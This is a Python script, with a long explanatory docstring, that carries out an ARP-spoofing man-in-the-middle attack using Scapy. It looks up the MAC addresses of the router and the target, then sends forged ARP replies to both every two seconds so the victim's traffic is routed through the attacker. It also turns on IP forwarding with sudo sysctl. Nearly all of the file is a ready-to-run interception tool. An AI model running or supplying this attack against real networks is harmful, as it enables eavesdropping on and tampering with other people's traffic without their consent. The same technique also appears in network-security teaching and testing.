#!/usr/bin/env python3
# Man In The Middle (MITM) Attack (ARP-SPOOFING) with Python =)
''''
---------------------------------------------------------Dappt---------------------------------------------------------

Script Usage (attack on a network with 3 machines: router, attacker, target):

        [-] Attacker sends ARP request to broadcast (everyone on LAN) in order to receive a response from someone who knows
            where the target machine is located 
            
            --> This request contains the mac address of broadcast (destination) and the
                IP address of the target machine 
            
            --> The request essentially asks everyone on the network (through the broadcast address) who has {targetIP}? 
                Hopefully a machine on the network who knows the location (MAC address of target machine) will respond with the 
                information we are looking for

        [-] Now that we have the MAC address of the target machine we can use it to craft a malicious packet that will tell
            the target machine that our MAC address is the same as the routers MAC address
            
            --> This will cause every outgoing packets from the target machine will be sent to both the router and the target
                machine
    
    Some useful Scapy commands:

        [-] ls(ARP) --> will list all fields required by an ARP packet
        
        [-] important fields: op, hwsrc,psrc, hwdst, pdst
        
        [-] packet = ARP(pdst='<TARGET IPADDR>') --> set pdst (destination address) to TARGETS IPADDR
        
        [-] packet.show --> show the current state of the packet being crafted
        
        [-] packet.op = 1 --> sending request --> "who has ..."
        
        [-] packet.op = 2 --> sending response

    Methodology: 

        [-] Send arp request through the broadcast MAC address, every machine on the LAN will receive 
            request and possibly send the reply
        
        [-] Impacket (manually):
            
            Getting mac address of target machine w/ spoofed ARP request :
            
                [-] broadcast = Ether(dst='ff:ff:ff:ff:ff:ff') --> Broadcast Address
                
                [-] arp_layer = ARP(pdst='{TARGETIP}')
                
                [-] entire_packet = broadcast/arp_layer --> combines arp_layer and broadcast layer into packet
                
                [-] answer = srp(entire_packet, timeout=2, verbose=True)[0] --> sending request to broadcast
                
                [-] print(answer) --> will show request and response if any received
                
                [-] print(answer[0])
                
                [-] target_mac_address = answer[0][1].hwsrc --> get mac address of target                                                                                                                                                                                                                                                                                  
                
                [-] print(target_mac_address)

            Craftinfg Malicious packet:

                [-] We are essentially going to craft a packet that will tell the target machine that
                    the attacker machine is a router, so it sends all of its packets to the attacker machine
                
                [-] packet = ARP(op=2, hwdst=target_mac_address, pdst='192.168.0.131', psrc='192.168.0.1')
                    
                    --> psrc is address of machine we want to impersonate (router)
                    --> run `netstat -nr` in terminal to find addr of router on your network (gateway)
                
                [-] packet.show() will show the contents of our malicious packet
                
                [-] send(packet, verbose=False) --> sends malicious packet to spoof targets ARP table
            
            Arp-tables on target machine:

                [-] You can run the command `arp -a` on the target machine before sending the malicious packet, 
                    and again after sending the malicious packet to confirm if we successfully spoofed the arp
                    tables on the target machine

[!] Script should be run in a while loop to continuosly spoof the targets arp tables since the target machine will also still 
    send the same ARP requests we are sending still

[!] If the target machine is unable to access the internet after it has been spoofed then you may need to run this command on your 
attacker machine to forward the packets: 

    [-] echo 1 >> /proc/sys/net/ipv4/ip_forward                                                                                                                                                                                                                                                                            



---------------------------------------------------------Dappt---------------------------------------------------------
'''
# Imports
import scapy.all as scapy
import sys
import time
import pyfiglet
import termcolor
import os

# ASCII banner
banner = pyfiglet.figlet_format("            Arp\nSpoof", font = "alligator")
termcolor.cprint('\n\n'+banner+'\n\n','red')

# Enable IP routing on attacker machine
try:
    os.popen('sudo sysctl -w net.ipv4.ip_forward=1')
    
except:
    print('\nUnable to set ip_forward on Attacker Machine to allow routing')


def getMac(ipAddr):
    
    # Craft request to be sent to broadcast (everyone)
    broadcastLayer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arpLayer = scapy.ARP(pdst=ipAddr)
    
    # Combine broadcast and ARP layers into malicious request packet
    getMacPacket = broadcastLayer/arpLayer
    
    # Send request and receive response with srp()
    answer = scapy.srp(getMacPacket, timeout=2, verbose=False)[0]
    
    # Return mac address of target machine
    return answer[0][1].hwsrc

# Get target/router ip addresses from arguments passed to script
targetIP = str(sys.argv[2])
routerIP = str(sys.argv[1])

# Get MAC address of target and router
targetMAC = str(getMac(targetIP))
routerMAC = str(getMac(routerIP))

# Print target and router MAC addrs
print(f'\nRouter MAC address: {routerMAC}')
print(f'Target machine MAC address: {targetMAC}')

# Define spoofing function to send malicious packet to target machine (spoofing th target ARP table)
def spoof(routerIP, targetIP, routerMAC, targetMAC):
    # Craft packet to be sent to router
    routerPkt = scapy.ARP(op=2, hwdst=routerMAC, pdst=routerIP, psrc= targetIP)
     # Craft packet to be sent to target
    targetPkt = scapy.ARP(op=2, hwdst=targetMAC, pdst=targetIP, psrc= routerIP)
    # Send crafted packets to router and target
    scapy.send(routerPkt, verbose=False)
    scapy.send(targetPkt, verbose=False)

try:
    termcolor.cprint(f"\n[*] Spoofing {targetIP}'s ARP table!\n[*] Routing Traffic\n","green")
    print('Ctrl+C to exit')
    while True:
        # Send spoofing packets
        spoof(routerIP, targetIP, routerMAC, targetMAC)
        # Add small timeout to allow spoof function to execute
        time.sleep(2)
except KeyboardInterrupt:
    print('\n\n[*] Nuking script, goodbye!\n')
    # Disable IP routing on attacker machine
    try:
        os.popen('sudo sysctl -w net.ipv4.ip_forward=0')
    except:
        print('Unable to set ip_forward on Attacker Machine to disable IP routing/forwarding')
    exit(0)